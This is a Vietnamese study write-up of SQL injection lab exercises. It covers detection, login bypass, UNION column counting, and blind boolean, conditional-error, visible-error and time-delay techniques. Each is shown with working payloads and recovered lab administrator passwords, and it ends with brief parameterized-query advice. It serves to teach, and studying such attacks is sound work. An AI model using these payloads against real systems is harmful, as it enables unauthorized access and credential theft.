# SQL-Injection-Basic

## Người thực hiện: Mai Anh
## Cập nhật: 04/08/2025 
1. Biết các phát hiện các trường hợp SQL INJECTION
2. Hiểu được nguyên nhân gây ra lỗi và tìm ra cách khai thác chi tiết
3. Biết được các lỗi từ các câu truy vấn phổ biến
4. Biết được các khắc phục lỗ hổng
5. Thống kê một số wordlist payload liên quan đến SQL INJECTION

SQL Injection (SQLI) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện vào cơ sở dữ liệu của nó. Điều này có thể cho phép kẻ tấn công xem dữ liệu mà họ thường không thể truy xuất. Bao gồm dữ liệu thuộc về người dùng khác hoặc bất kỳ dữ liệu nào khác mà ứng dụng có thể truy cập. Trong nhiều trường hợp, kẻ tấn công có thể sửa đổi hoặc xóa dữ liệu này, gây ra những thay đổi liên tục đối với nội dung hoặc hành vi của ứng dụng.

## 1. Cách phát hiện lỗ hổng SQL Injection

Để phát hiện SQL Injection thủ công, mình cần thử từng điểm nhập trong ứng dụng một cách có hệ thống. Cách làm thường là:

- **Gửi dấu nháy đơn `'`** vào các ô nhập rồi xem ứng dụng có lỗi hay phản hồi lạ không.
- **Thử một số cú pháp SQL** để so sánh xem khi mình nhập giá trị giống ban đầu với giá trị khác thì phản hồi của web có khác nhau không.
- **Dùng các điều kiện dạng boolean** như `OR 1=1` (đúng) và `OR 1=2` (sai), rồi so sánh kết quả trả về để xem có điểm bất thường gì không.
- **Gửi payload có chứa câu lệnh gây delay** (làm chậm) như `SLEEP(5)` rồi xem phản hồi của server có bị chậm lại không → nếu có thì có khả năng là bị SQLi.
- **Dùng các payload OAST** để tạo ra tương tác mạng ngoài luồng, nếu có tương tác xảy ra thì có thể ứng dụng đang bị dính lỗi SQLi kiểu out-of-band.

## 2. Nguyên nhân gây ra lỗi và tìm ra cách khai thác chi tiết
SQL Injection có nhiều dạng khác nhau tùy vào cách ứng dụng xử lý dữ liệu đầu vào. Dưới đây là một số ví dụ phổ biến mà mình thường thấy:
#### Lấy dữ liệu bị ẩn (Retrieving hidden data):  
  Đây là khi mình sửa lại câu lệnh SQL để lấy thêm dữ liệu mà bình thường không hiển thị ra, ví dụ như xem thông tin của người dùng khác.
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
- Trong bài lab này, khai thác lỗi SQL Injection nằm ở phần điều kiện `WHERE` để **bỏ qua điều kiện lọc sản phẩm đã phát hành**, từ đó lấy ra tất cả sản phẩm.

**Payload được sử dụng:**

```sql
' OR 1=1--
```

**URL sau khi chèn payload:**
```
https://insecure-website.com/filter?category=' OR 1=1--
```
**Truy vấn SQL sau khi bị chèn:**

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

**Giải thích:**
- `OR 1=1`: điều kiện **luôn đúng**, nên truy vấn sẽ lấy toàn bộ dữ liệu trong bảng.
- `--`: là cú pháp **comment** trong SQL → giúp **bỏ qua phần còn lại của truy vấn** (`AND released = 1`).
- Kết quả là **tất cả sản phẩm, bao gồm cả những sản phẩm chưa phát hành**, sẽ được hiển thị ra giao diện.

 <img width="1867" height="966" alt="image" src="https://github.com/user-attachments/assets/455d3df3-4b37-48a0-ab1e-0a234e2077d4" />
 <img width="1503" height="919" alt="image" src="https://github.com/user-attachments/assets/18ccd4b4-4155-459f-8a61-17062011e29f" />


> **Kết luận**: Với payload đơn giản, mình đã bypass được điều kiện lọc `released = 1` và hiển thị được toàn bộ sản phẩm. Điều này chứng minh ứng dụng dễ bị khai thác nếu không xử lý đầu vào người dùng cẩn thận.

#### Thay đổi logic ứng dụng (Subverting application logic):  
  Ta có thể chèn thêm câu lệnh vào để thay đổi cách ứng dụng xử lý logic, ví dụ đăng nhập mà không cần mật khẩu đúng.
  - Lab: SQL injection vulnerability allowing login bypass
    Để vượt qua xác thực, ta sử dụng payload administrator'-- trong trường "Username", để mật khẩu bất kì ở ô "Password" vì ô được ràng buộc để không được bỏ trống, và nhấn "Log in".
    
    <img width="1864" height="875" alt="image" src="https://github.com/user-attachments/assets/e0e327d7-6018-491d-9393-cb6987ee16f1" />
    
    Ký tự -- comment phần kiểm tra mật khẩu, khiến truy vấn SQL chỉ kiểm tra username và bỏ qua phần password, cho phép đăng nhập thành công với vai trò "administrator".
    
    <img width="1862" height="878" alt="image" src="https://github.com/user-attachments/assets/86f4c684-64af-4632-8420-de1a071016aa" />

    >**Kết quả**: Truy cập được tài khoản admin mà không cần mật khẩu

#### Tấn công bằng UNION (UNION attacks):  
Khi một ứng dụng bị lỗ hổng SQL injection và kết quả của truy vấn được trả về trong phản hồi của ứng dụng, có thể dùng từ khóa UNION để lấy dữ liệu từ các bảng khác trong cơ sở dữ liệu.
**Lab: SQL injection UNION attack, determining the number of columns returned by the query**
  - Xác định số lượng cột của câu truy vấn ban đầu thông qua kỹ thuật UNION-based SQL Injection, bằng cách: Chèn thêm các giá trị NULL cho đến khi không còn lỗi xuất hiện.
  - Truy cập Burp Suite và chặn request
    + Truy cập lab và chọn một bộ lọc category (danh mục).
    + Dùng Burp Suite để Intercept request gửi đến server khi chọn category.Chuột phải vào request → chọn "Send to Repeater".
    <img width="1919" height="805" alt="image" src="https://github.com/user-attachments/assets/76e741ac-b0ab-4da2-b7f1-b395da985a53" />

    + Chuyển qua tab Repeater, sẽ thấy URL như:
      ```
      GET /filter?category=Gifts HTTP/1.1
      ```
  - Sửa category để thêm payload SQLi và gửi đi để ktra:
    ```
    GET /filter?category=Accessories'+UNION+SELECT+NULL-- HTTP/1.1
    ```
    <img width="1537" height="711" alt="image" src="https://github.com/user-attachments/assets/d0cc79aa-f676-4c88-acdf-6e9bea798108" />
    > Tiếp tục tăng NULL nếu bị lỗi.
    
    <img width="1480" height="716" alt="image" src="https://github.com/user-attachments/assets/36e7465e-f0b4-4247-9fa4-3578b4471383" />
    
  - Khi response không còn lỗi và bạn thấy "null" xuất hiện trong nội dung HTML → tức là số lượng NULL đúng với số cột.
  - Số lượng NULL trong payload lúc này chính là số cột trong query.
    <img width="1898" height="949" alt="image" src="https://github.com/user-attachments/assets/d1ee5a78-9195-467b-a4ea-e4eaae118a3a" />

#### SQL Injection mù (Blind SQL Injection):  
  SQL injection mù xảy ra khi một ứng dụng tồn tại lỗ hổng SQL injection, nhưng phản hồi HTTP của nó không chứa kết quả của truy vấn SQL liên quan hoặc chi tiết lỗi từ cơ sở dữ liệu.
- **Khai thác blind SQL injection bằng cách kích hoạt phản hồi có điều kiện**
  Truy vấn này có lỗ hổng SQL injection, nhưng kết quả không trả về cho người dùng. Tuy nhiên, ứng dụng sẽ thay đổi hành vi tùy vào việc truy vấn có trả kết quả hay không.
  ```
  ...xyz' AND '1'='1
  ...xyz' AND '1'='2
  ```
  + Nếu TrackingId hợp lệ → truy vấn trả kết quả → hiển thị thông báo "Welcome back".
  + Nếu TrackingId không hợp lệ → không hiển thị thông báo đó.
> Dựa vào sự khác biệt này, ta có thể khai thác SQLi mù bằng cách chèn điều kiện để kiểm tra từng thông tin.

**Lab: Blind SQL injection with conditional responses**
1) Xác nhận tham số dễ bị Blind SQLi
   ```
    TrackingId=Yf6Tdf7oLD3eWgG7' AND '1'='1
    TrackingId=Yf6Tdf7oLD3eWgG7' AND '1'='2
   ```
   
<img width="1496" height="650" alt="image" src="https://github.com/user-attachments/assets/b2e552db-87eb-4842-822c-1dfa37da3f5f" />
> Điều kiện TRUE → xuất hiện "Welcome back"

<img width="1496" height="721" alt="image" src="https://github.com/user-attachments/assets/1e7f95de-0aa0-445b-9d21-a67738ec66bc" />
> Điều kiện FALSE  → không xuất hiện "Welcome back"

2) Xác nhận tồn tại bảng users
```
TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT 'a' FROM users LIMIT 1)='a
```
<img width="1492" height="713" alt="image" src="https://github.com/user-attachments/assets/fc95ad7b-b85f-4cdf-b526-c13275d8cdf8" />
>  Bảng users tồn tại trong cơ sở dữ liệu.

3) Xác nhận tồn tại user _administrator_ trong bảng users
```
TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
<img width="1506" height="703" alt="image" src="https://github.com/user-attachments/assets/920704bf-ad8b-479e-99a1-1e4216edffe0" />
> User _administrator_ có tồn tại 

4) Liệt kê (enumerate) mật khẩu của user administrator
```
TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
<img width="1493" height="565" alt="image" src="https://github.com/user-attachments/assets/d2b41d18-3ef9-4b8b-9f23-444973e7e2f8" />
> Điều kiện này phải đúng, xác nhận rằng mật khẩu có chiều dài lớn hơn 1 ký tự.
Lấn lượt tăng số sao cho đến khi không hiện Welcome back, sau khi thử nhieuf lần thì thấy tới 20 là không hiện Welcome back nữa => mật khẩu có 20 kí tự
<img width="1482" height="763" alt="image" src="https://github.com/user-attachments/assets/c3e34073-d82f-41b5-a07b-39bdda227739" />

5) Dò mật khẩu của administrator
```
TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
Lấy mật khẩu của user 'administrator' trong bảng users, lấy từ ký tự thứ 1 của chuỗi password, số lượng ký tự = 1 và so sánh với kí tự 'a'
- Nếu kí tự đầu tiên của pw là 'a' thì điều kiện đúng
- Nếu khác 'a' thì điều kiện sai
<img width="1487" height="651" alt="image" src="https://github.com/user-attachments/assets/da6978a3-002e-483e-8908-5b9d9f5efcad" />
> Kí tự đầu tiên trong pw không phải là 'a'

Thêm vào Intruder để dò mật khẩu
<img width="1913" height="869" alt="image" src="https://github.com/user-attachments/assets/794c1884-a885-43f8-852e-2a1ebdd16541" />
<img width="637" height="505" alt="image" src="https://github.com/user-attachments/assets/8301dfc4-4982-4a22-a0c2-f2721ee9dccc" />
- Lọc để chọn ra những mật khẩu hiện "Welcome back"
<img width="1569" height="514" alt="image" src="https://github.com/user-attachments/assets/ada2899e-8b39-452c-baa5-92b610c0833f" />
- viết lại các kí tự lần lượt theo thứ tự từ 1 - 20 
<img width="1530" height="713" alt="image" src="https://github.com/user-attachments/assets/1cde8257-350f-4d67-a177-853476e86b00" />
>  Ta có mật khẩu là _oa7uk3lrbpf9xct78f9v_
<img width="1836" height="830" alt="image" src="https://github.com/user-attachments/assets/db5a7fe7-57a3-452b-b5cb-12c2bbda3afd" />
> Đăng nhập thành công

- **SQL Injection dựa trên lỗi (Error-based SQL injection)**
Là kỹ thuật lợi dụng thông báo lỗi từ cơ sở dữ liệu để trích xuất hoặc suy luận dữ liệu nhạy cảm, kể cả trong trường hợp mù.
  + Có thể tạo lỗi dựa vào điều kiện boolean.
  + Hoặc tạo lỗi hiển thị trực tiếp dữ liệu truy vấn, biến blind SQLi thành SQLi hiển thị.
  Ví dụ tạo lỗi có điều kiện bằng CASE:
```
bash
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
> Nếu ứng dụng trả phản hồi khác nhau khi có lỗi, suy ra điều kiện đúng/sai.

**Lab: Blind SQL injection with conditional errors**
1) Kiểm tra xem tham số TrackingId có dễ bị SQL injection không bằng cách tạo lỗi cú pháp SQL bằng thêm ' cuối câu
```
    TrackingId=XsBHVreWLfm3R2QJ'
```
<img width="1495" height="557" alt="image" src="https://github.com/user-attachments/assets/2963978f-6136-45a2-aba1-3f155a443752" />

Gây lỗi cú pháp SQL (SQL syntax error),việc nhận được thông báo lỗi chứng tỏ input đã tác động đến cú pháp truy vấn → khả năng cao là tham số này dễ bị SQLi.

```
    TrackingId=XsBHVreWLfm3R2QJ''
```
<img width="1492" height="784" alt="image" src="https://github.com/user-attachments/assets/92876eda-b90c-4246-8b09-e5e86864b07f" />

> lỗi biến mất → chứng minh rằng lỗi ban nãy là do cú pháp SQL sai chứ không phải lỗi hệ thống khác.

2) Chứng minh tham số dễ bị tấn công

```
    TrackingId=ChejPJijGNFuDRrd'||(SELECT '' FROM dual)||'
```
<img width="1497" height="704" alt="image" src="https://github.com/user-attachments/assets/fcdc141d-1df1-44c1-a0af-64afd33edda9" />
> Xác nhận cơ sở dữ liệu sử dụng là Oracle.
```
    TrackingId=ChejPJijGNFuDRrd'||(SELECT '' FROM not-a-real-table)||'
```
<img width="1487" height="595" alt="image" src="https://github.com/user-attachments/assets/2c950a3d-1156-4544-a3a7-18eafc3c65ec" />
Trả về lỗi => biết được rằng dữ liệu chèn vào được thực thi trong câu lệnh SQL.

3) Xác nhận bảng users tồn tại trong cơ sở dữ liệu
```
    TrackingId=ChejPJijGNFuDRrd'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
<img width="1479" height="803" alt="image" src="https://github.com/user-attachments/assets/77de35e8-f3cf-4467-8cbf-e0627cb26cea" />
> Bảng user tồn tại 

4) Khai thác điều kiện bằng CASE để tạo lỗi có điều kiện.
```
    TrackingId=oZZ3vis3DjVR0yex'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
<img width="1485" height="617" alt="image" src="https://github.com/user-attachments/assets/fbfb5bb0-5980-42fe-9704-2f7dfc5a53a1" />
→ Có lỗi (chia cho 0).
<img width="1477" height="757" alt="image" src="https://github.com/user-attachments/assets/1510b82b-5673-4d27-9289-ea344624ad9f" />
→ Không lỗi.
> → Điều này chứng minh có thể tạo lỗi dựa trên điều kiện đúng/sai.

5) Kiểm tra user administrator có tồn tại:
```
    TrackingId=oZZ3vis3DjVR0yex'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
<img width="1493" height="539" alt="image" src="https://github.com/user-attachments/assets/0c9a8a34-9a54-4f92-84c1-df79c2dbde8a" />
→ Có lỗi → user administrator tồn tại.

6) Xác định độ dài mật khẩu của administrator:
```
    TrackingId=oZZ3vis3DjVR0yex'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
<img width="1489" height="569" alt="image" src="https://github.com/user-attachments/assets/c5332216-5f0b-44a9-a488-0bfef1253328" />
> Gặp lỗi => mật khẩu dài hơn 1 kí tự
- Tương tự thử đến khi nào hết lỗi thì dừng, và khi tăng tới số 20 thì không còn lỗi
<img width="1481" height="653" alt="image" src="https://github.com/user-attachments/assets/0c49ed81-7dc6-4c59-b35c-59010d777f33" />
> Mật khẩu có 20 kí tự

7) Brute force mật khẩu bằng Intruder

<img width="1915" height="801" alt="image" src="https://github.com/user-attachments/assets/41e638f8-cefc-49fc-b684-016734a88c5f" />
<img width="1559" height="702" alt="image" src="https://github.com/user-attachments/assets/2cf6e89c-d1f3-46ee-82b4-8b7543838042" />
> Mật khẩu có được 7i7wvokhsq56b4q7m0re

<img width="1860" height="720" alt="image" src="https://github.com/user-attachments/assets/2a9f0e32-94b7-4986-82e9-5088a97ae9bb" />
> Đăng nhập thành công

- **Trích xuất dữ liệu nhạy cảm qua lỗi chi tiết**
  ```
  ERROR: invalid input syntax for type integer: "Example data"
  ```
**Lab: Visible error-based SQL injection**
1) Trong Repeater, thêm một dấu nháy đơn ' vào giá trị cookie TrackingId rồi gửi request:
<img width="1492" height="680" alt="image" src="https://github.com/user-attachments/assets/6bd56945-9c4c-459c-99b0-187d5ca1bf26" />
> Trong response, chú ý thông báo lỗi chi tiết. Nó tiết lộ toàn bộ câu lệnh SQL, bao gồm cả giá trị cookie.

2) Thêm dấu comment vào giá trị trên thì không còn hiện lỗi
<img width="1479" height="758" alt="image" src="https://github.com/user-attachments/assets/8a26d8f9-9f59-41c3-a1f2-598040cd05e0" />

3) chạy một subquery SELECT và ép kiểu kết quả về int:
```
    TrackingId=vKj3VnZ6ctQznt4S' AND CAST((SELECT 1) AS int)--
```
<img width="1485" height="607" alt="image" src="https://github.com/user-attachments/assets/b12dea8d-5cc8-4bdd-b9d4-a137c59c33d8" />

thấy lỗi khác: AND condition must be a boolean expression (điều kiện trong AND phải là biểu thức Boolean).
> Dữ liệu bạn chèn vào đang được xử lý trong một câu lệnh SQL thật sự.

4) Sửa điều kiện cho đúng bằng cách thêm toán tử so sánh =
```
    TrackingId=vKj3VnZ6ctQznt4S' AND 1=CAST((SELECT 1) AS int)--
```
<img width="1484" height="785" alt="image" src="https://github.com/user-attachments/assets/963b9c6d-7fee-49fe-8cf1-ebd2a5469cf3" />
>  Không còn lỗi nữa ⇒ query hợp lệ.
5) Thay đổi SELECT để lấy dữ liệu username từ CSDL:
<img width="1490" height="710" alt="image" src="https://github.com/user-attachments/assets/3d7318ad-6500-4b5e-9980-64e7993c4839" />
> xuất hiện lại lỗi ban đầu. Payload có vẻ bị cắt ngắn do giới hạn ký tự, nên phần comment -- không còn.

6) Xoá giá trị gốc của cookie TrackingId để tiết kiệm ký tự. 
<img width="1499" height="646" alt="image" src="https://github.com/user-attachments/assets/ec1849f9-1eb8-4b53-8b3c-7a7218f57b69" />

 > subquery (SELECT username FROM users) trả về nhiều dòng → Database không biết chọn cái nào để so sánh → báo lỗi.
7) Sửa query để chỉ trả về 1 dòng:
  ```
    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  ```
<img width="1490" height="624" alt="image" src="https://github.com/user-attachments/assets/b520b8b4-8320-4ec3-a249-7dfbcac43dec" />
> Lộ ra usrname đầu tiên trong bảng là administrator
vaf sửa lại query để lộ mật khẩu
  ```
    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```
<img width="1477" height="667" alt="image" src="https://github.com/user-attachments/assets/7df612e7-42e1-40b4-a7fd-83e39d253870" />
> Lộ mật khẩu của usr đầu tiên là 4exxf0il4jack4c09fz3
- Sau khi có usr và pwd thì đăng nhập thành công
<img width="1851" height="778" alt="image" src="https://github.com/user-attachments/assets/ed04b516-cd38-478c-8acd-e2e1043d1f6a" />

- **Khai thác blind SQL injection bằng cách kích hoạt độ trễ (Time Delay)**
  ```
  '; IF (1=2) WAITFOR DELAY '0:0:10'--
  '; IF (1=1) WAITFOR DELAY '0:0:10'--
  ```
- **Khai thác blind SQL injection bằng kỹ thuật out-of-band (OAST)**
  Khi ứng dụng thực thi truy vấn không đồng bộ hoặc phản hồi không phụ thuộc vào dữ liệu/lỗi/thời gian → các kỹ thuật trước sẽ thất bại.
  => Kích hoạt tương tác mạng ra ngoài (DNS, HTTP…) tới máy chủ do kẻ tấn công kiểm soát, từ đó:
  + Suy ra điều kiện.
  + Hoặc exfiltrate (rò rỉ) dữ liệu trực tiếp qua yêu cầu mạng.
##  4. Các biện pháp phòng chống giống với SQLi thông thường:
- Sử dụng truy vấn tham số hóa (parameterized queries) để tách dữ liệu nhập từ cấu trúc câu lệnh SQL.
- Không ghép chuỗi trực tiếp dữ liệu đầu vào vào câu truy vấn.
- Kiểm tra và lọc dữ liệu đầu vào.
